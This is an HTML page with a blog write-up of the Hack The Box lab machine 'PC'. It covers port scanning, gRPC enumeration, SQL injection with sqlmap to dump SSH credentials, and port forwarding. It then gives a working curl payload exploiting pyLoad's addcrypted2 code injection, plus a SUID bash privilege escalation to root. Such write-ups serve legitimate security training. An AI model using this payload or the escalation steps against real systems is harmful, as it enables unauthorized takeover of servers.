<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Hack The Box - PC [Easy] | 0x73796C31</title>
<meta name=keywords content="hackthebox"><meta name=description content="This machine has only 2 ports open:
$ nmap 10.10.11.214 -Pn -p- 22/tcp open ssh 50051/tcp open unknown Using telnet to see what is 50051, we get:
telnet 10.10.11.214 50051 Trying 10.10.11.214... Connected to 10.10.11.214. Escape character is '^]'. ?�?� �?^CConnection closed by foreign host. Which is some random binary data. I&rsquo;ve explored it with hexdump.
0000000 0000 0418 0000 0000 0000 0004 ff3f 00ff 0000010 0005 ff3f 00ff 0006 2000 fe00 0003 0000 0000020 0001 0400 0008 0000 0000 3f00 0000 000002e I didn&rsquo;t figure out what it was, so I googled the port which led me to this question: https://stackoverflow."><meta name=author content="Dimitar Ganev"><link rel=canonical href=https://sy1.sh/writeups/htb-pc/><link crossorigin=anonymous href=/assets/css/stylesheet.f8c2ee4fde28779dff9afcd3046f6bd6fc9cbeb1ddf60d48a81b676d7162c1bb.css integrity="sha256-+MLuT94od53/mvzTBG9r1vycvrHd9g1IqBtnbXFiwbs=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://sy1.sh/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://sy1.sh/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://sy1.sh/favicon-32x32.png><link rel=apple-touch-icon href=https://sy1.sh/apple-touch-icon.png><link rel=mask-icon href=https://sy1.sh/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Hack The Box - PC [Easy]"><meta property="og:description" content="This machine has only 2 ports open:
$ nmap 10.10.11.214 -Pn -p- 22/tcp open ssh 50051/tcp open unknown Using telnet to see what is 50051, we get:
telnet 10.10.11.214 50051 Trying 10.10.11.214... Connected to 10.10.11.214. Escape character is '^]'. ?�?� �?^CConnection closed by foreign host. Which is some random binary data. I&rsquo;ve explored it with hexdump.
0000000 0000 0418 0000 0000 0000 0004 ff3f 00ff 0000010 0005 ff3f 00ff 0006 2000 fe00 0003 0000 0000020 0001 0400 0008 0000 0000 3f00 0000 000002e I didn&rsquo;t figure out what it was, so I googled the port which led me to this question: https://stackoverflow."><meta property="og:type" content="article"><meta property="og:url" content="https://sy1.sh/writeups/htb-pc/"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2023-05-26T02:01:27+03:00"><meta property="article:modified_time" content="2023-05-26T02:01:27+03:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Hack The Box - PC [Easy]"><meta name=twitter:description content="This machine has only 2 ports open:
$ nmap 10.10.11.214 -Pn -p- 22/tcp open ssh 50051/tcp open unknown Using telnet to see what is 50051, we get:
telnet 10.10.11.214 50051 Trying 10.10.11.214... Connected to 10.10.11.214. Escape character is '^]'. ?�?� �?^CConnection closed by foreign host. Which is some random binary data. I&rsquo;ve explored it with hexdump.
0000000 0000 0418 0000 0000 0000 0004 ff3f 00ff 0000010 0005 ff3f 00ff 0006 2000 fe00 0003 0000 0000020 0001 0400 0008 0000 0000 3f00 0000 000002e I didn&rsquo;t figure out what it was, so I googled the port which led me to this question: https://stackoverflow."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Writeups","item":"https://sy1.sh/writeups/"},{"@type":"ListItem","position":3,"name":"Hack The Box - PC [Easy]","item":"https://sy1.sh/writeups/htb-pc/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Hack The Box - PC [Easy]","name":"Hack The Box - PC [Easy]","description":"This machine has only 2 ports open:\n$ nmap 10.10.11.214 -Pn -p- 22/tcp open ssh 50051/tcp open unknown Using telnet to see what is 50051, we get:\ntelnet 10.10.11.214 50051 Trying 10.10.11.214... Connected to 10.10.11.214. Escape character is \u0026#39;^]\u0026#39;. \u0018\u0004\u0004?�\u0005?�\u0006 �\u0003\u0001?^CConnection closed by foreign host. Which is some random binary data. I\u0026rsquo;ve explored it with hexdump.\n0000000 0000 0418 0000 0000 0000 0004 ff3f 00ff 0000010 0005 ff3f 00ff 0006 2000 fe00 0003 0000 0000020 0001 0400 0008 0000 0000 3f00 0000 000002e I didn\u0026rsquo;t figure out what it was, so I googled the port which led me to this question: https://stackoverflow.","keywords":["hackthebox"],"articleBody":"This machine has only 2 ports open:\n$ nmap 10.10.11.214 -Pn -p- 22/tcp open ssh 50051/tcp open unknown Using telnet to see what is 50051, we get:\ntelnet 10.10.11.214 50051 Trying 10.10.11.214... Connected to 10.10.11.214. Escape character is '^]'. \u0018\u0004\u0004?�\u0005?�\u0006 �\u0003\u0001?^CConnection closed by foreign host. Which is some random binary data. I’ve explored it with hexdump.\n0000000 0000 0418 0000 0000 0000 0004 ff3f 00ff 0000010 0005 ff3f 00ff 0006 2000 fe00 0003 0000 0000020 0001 0400 0008 0000 0000 3f00 0000 000002e I didn’t figure out what it was, so I googled the port which led me to this question: https://stackoverflow.com/questions/55990378/i-tried-to-deploy-grpc-go-server-in-docker-and-expose-port-in-local-port-but-p\nI’ve figured out that this is some rpc server. Using grpcui we can see the following app structure.\n$ grpcui -plaintext 10.10.11.214:50051 --- SimpleApp.LoginUser { username string password string } SimpleApp.RegisterUser { username string password string } SimpleApp.getInfo { id string } I’ve used admin:admin to login, and I got a token and a data:\n{ \"message\": \"Your id is 80.\" } // token\tb'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUxODM0MDh9.Hpp12rEGhXQONEN2yi65_NCuMQNN5fnvtJbFhI_PEZk' I’ve used the Request Metadata to send the token when calling the getInfo procedure.\nMeta: token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUxODM0MDh9.Hpp12rEGhXQONEN2yi65_NCuMQNN5fnvtJbFhI_PEZk Data: id: 80 This got me:\n{ \"message\": \"Will update soon.\" } I have no idea what is happening at this point, and I decided to run sqlmap on those requests.\nTo do that I had to capture the request that is going to the server, I can proxy the UI’s requests towards the RPC with burp. Start burp and intercept the gRPC Web UI and capture the request towards the server. Then save the request to getInfo into a file.\nUsing sqlmap -r request_file --batch we can dump the credentials for the user and login with the ssh.\nNow the root is a bit tricky, I’ve noticed some processes that are running on port 8000 using linpeas. This port is inaccessible, so I had to forward the port to my host using ssh.\n$ ssh -L 8000:127.0.0.1:8000 sau@10.10.11.214 Now I can access it, and it turns out to be pyLoad, searching around I saw this:\nhttps://github.com/advisories/GHSA-pf38-5p22-x6h6 https://github.com/pyload/pyload/commit/7d73ba7919e594d783b3411d7ddb87885aea782d https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/\nWhere I can see the following payload\ncurl -i -s -k -X $'POST' \\ -H $'Host: 127.0.0.1:8000' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 184' \\ --data-binary $'package=xxx\u0026crypted=AAAA\u0026jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%74%6f%75%63%68%20%2f%74%6d%70%2f%70%77%6e%64%22%29;f=function%20f2(){};\u0026passwords=aaaa' \\ $'http://127.0.0.1:8000/flash/addcrypted2' Decoding the payload on the jk param: pyimport os;os.system(\"touch /tmp/pwnd\");f=function f2(){};\nNow we just have to encode chmod +s /bin/bash into os.system(). After executing that payload, we can launch bash in privilege mode bash -p and I got root.\n","wordCount":"409","inLanguage":"en","datePublished":"2023-05-26T02:01:27+03:00","dateModified":"2023-05-26T02:01:27+03:00","author":{"@type":"Person","name":"Dimitar Ganev"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://sy1.sh/writeups/htb-pc/"},"publisher":{"@type":"Organization","name":"0x73796C31","logo":{"@type":"ImageObject","url":"https://sy1.sh/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://sy1.sh accesskey=h title="0x73796C31 (Alt + H)">0x73796C31</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://sy1.sh/posts/ title=Archive><span>Archive</span></a></li><li><a href=https://sy1.sh/cv title=CV><span>About</span></a></li><li><a href=https://sy1.sh/writeups/ title=Write-ups><span>Write-ups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://sy1.sh>Home</a>&nbsp;»&nbsp;<a href=https://sy1.sh/writeups/>Writeups</a></div><h1 class=post-title>Hack The Box - PC [Easy]</h1><div class=post-meta>&lt;span title='2023-05-26 02:01:27 +0300 +0300'>May 26, 2023&lt;/span>&amp;nbsp;·&amp;nbsp;2 min</div></header><div class=post-content><p>This machine has only 2 ports open:</p><pre tabindex=0><code>$ nmap 10.10.11.214 -Pn -p-
22/tcp    open  ssh
50051/tcp open  unknown
</code></pre><p>Using telnet to see what is <code>50051</code>, we get:</p><pre tabindex=0><code>telnet 10.10.11.214 50051
Trying 10.10.11.214...
Connected to 10.10.11.214.
Escape character is &#39;^]&#39;.
?�?� �?^CConnection closed by foreign host.
</code></pre><p>Which is some random binary data. I&rsquo;ve explored it with <code>hexdump</code>.</p><pre tabindex=0><code>0000000 0000 0418 0000 0000 0000 0004 ff3f 00ff
0000010 0005 ff3f 00ff 0006 2000 fe00 0003 0000
0000020 0001 0400 0008 0000 0000 3f00 0000
000002e
</code></pre><p>I didn&rsquo;t figure out what it was, so I googled the port which led me to this question: <a href=https://stackoverflow.com/questions/55990378/i-tried-to-deploy-grpc-go-server-in-docker-and-expose-port-in-local-port-but-p>https://stackoverflow.com/questions/55990378/i-tried-to-deploy-grpc-go-server-in-docker-and-expose-port-in-local-port-but-p</a></p><p>I&rsquo;ve figured out that this is some <code>rpc</code> server. Using <code>grpcui</code> we can see the following app structure.</p><pre tabindex=0><code>$ grpcui -plaintext 10.10.11.214:50051
--- 

SimpleApp.LoginUser {
    username string
    password string
}
SimpleApp.RegisterUser {
    username string
    password string
}
SimpleApp.getInfo {
    id string
}
</code></pre><p>I&rsquo;ve used <code>admin:admin</code> to login, and I got a token and a data:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;message&#34;</span><span class=p>:</span> <span class=s2>&#34;Your id is 80.&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// token	b&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUxODM0MDh9.Hpp12rEGhXQONEN2yi65_NCuMQNN5fnvtJbFhI_PEZk&#39;
</span></span></span></code></pre></div><p>I&rsquo;ve used the <code>Request Metadata</code> to send the token when calling the getInfo procedure.</p><pre tabindex=0><code>Meta:
token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUxODM0MDh9.Hpp12rEGhXQONEN2yi65_NCuMQNN5fnvtJbFhI_PEZk

Data:
id: 80
</code></pre><p>This got me:</p><pre tabindex=0><code>{
  &#34;message&#34;: &#34;Will update soon.&#34;
}
</code></pre><p>I have no idea what is happening at this point, and I decided to run <code>sqlmap</code> on those requests.</p><p>To do that I had to capture the request that is going to the server, I can proxy the UI&rsquo;s requests towards the RPC with <code>burp</code>. Start <code>burp</code> and intercept the gRPC Web UI and capture the request towards the server. Then save the request to <code>getInfo</code> into a file.</p><p>Using <code>sqlmap -r request_file --batch</code> we can dump the credentials for the user and login with the <code>ssh</code>.</p><p>Now the root is a bit tricky, I&rsquo;ve noticed some processes that are running on port 8000 using <code>linpeas</code>. This port is inaccessible, so I had to forward the port to my host using ssh.</p><pre tabindex=0><code>$ ssh -L 8000:127.0.0.1:8000 sau@10.10.11.214
</code></pre><p>Now I can access it, and it turns out to be pyLoad, searching around I saw this:</p><p><a href=https://github.com/advisories/GHSA-pf38-5p22-x6h6>https://github.com/advisories/GHSA-pf38-5p22-x6h6</a>
<a href=https://github.com/pyload/pyload/commit/7d73ba7919e594d783b3411d7ddb87885aea782d>https://github.com/pyload/pyload/commit/7d73ba7919e594d783b3411d7ddb87885aea782d</a>
<a href=https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/>https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/</a></p><p>Where I can see the following payload</p><pre tabindex=0><code>curl -i -s -k -X $&#39;POST&#39; \
    -H $&#39;Host: 127.0.0.1:8000&#39; -H $&#39;Content-Type: application/x-www-form-urlencoded&#39; -H $&#39;Content-Length: 184&#39; \
    --data-binary $&#39;package=xxx&amp;crypted=AAAA&amp;jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%74%6f%75%63%68%20%2f%74%6d%70%2f%70%77%6e%64%22%29;f=function%20f2(){};&amp;passwords=aaaa&#39; \
    $&#39;http://127.0.0.1:8000/flash/addcrypted2&#39;
</code></pre><p>Decoding the payload on the <code>jk</code> param: <code>pyimport os;os.system("touch /tmp/pwnd");f=function f2(){};</code></p><p>Now we just have to encode <code>chmod +s /bin/bash</code> into <code>os.system()</code>. After executing that payload, we can launch bash in privilege mode <code>bash -p</code> and I got root.</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://sy1.sh/tags/hackthebox/>hackthebox</a></li></ul><nav class=paginav><a class=prev href=https://sy1.sh/writeups/htb-interface/><span class=title>« Prev</span><br><span>Hack The Box - Interface [Medium]</span>
</a><a class=next href=https://sy1.sh/writeups/htb-precious/><span class=title>Next »</span><br><span>Hack The Box - Precious [Easy]</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://sy1.sh>0x73796C31</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod (sy1 modified)</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>